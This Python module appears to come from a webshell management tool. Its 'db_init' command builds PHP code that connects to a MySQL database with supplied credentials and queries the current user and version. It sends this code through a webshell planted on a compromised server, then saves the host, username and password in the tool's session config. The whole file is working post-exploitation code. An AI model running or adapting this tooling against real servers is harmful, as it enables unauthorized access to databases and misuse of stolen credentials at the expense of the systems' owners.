from libs.config import alias, color, gget, gset
from libs.myapp import send


def get_connect_code(host="", username="", password="", dbname="", port=""):
    host = host if host else gget("db_host", "webshell", "")
    username = username if username else gget("db_username", "webshell", "")
    password = password if password else gget("db_password", "webshell", "")
    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
    port = port if port else gget("db_port", "webshell", "")
    connect_code = '$con=mysqli_connect(%s);'
    temp_code = ",".join([f'"{y}"' for y in filter(lambda x: x, (host, username, password, dbname, port))])
    return connect_code % temp_code


def get_php(host, username, password, dbname, port):
    return """%s
if (!$con)
{
die("Connect error: ".mysqli_connect_error());
} else{
$r=$con->query('select user();');
foreach($r->fetch_all(MYSQLI_NUM) as $v){echo $v[0]."\\n";}$r->close();
$r=$con->query('select version();');
foreach($r->fetch_all(MYSQLI_NUM) as $v){echo $v[0]."\\n";}$r->close();
$con->close();
}""" % get_connect_code(host, username, password, dbname, port)


@alias(True, h="host", u="username", pwd="password", p="port")
def run(host: str, username: str, password: str, dbname: str = "", port: int = 0):
    """
    db_init

    Initialize the database connection.
    """
    res = send(get_php(host, username, password, dbname, port))
    if (not res):
        return
    if ("Connect error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print("\n" + color.green("Connect success"))
        gset("db_connected", True, True, "webshell")
        gset("db_host", host, True, "webshell")
        gset("db_username", username, True, "webshell")
        gset("db_password", password, True, "webshell")
        gset("db_dbname", dbname, True, "webshell")
        gset("db_port", port, True, "webshell")
        info = res.r_text.strip()
        if (info):
            info_list = info.split("\n")
            try:
                print(f"\nCurrenct User:\n  {info_list[0]}\n")
                print(f"\nMysql Version:\n  {info_list[1]}\n")
                gset("db_current_user", info_list[0], True, "webshell")
                gset("db_version", info_list[1], True, "webshell")
            except IndexError:
                print("\n" + color.red("Select data error") + "\n")
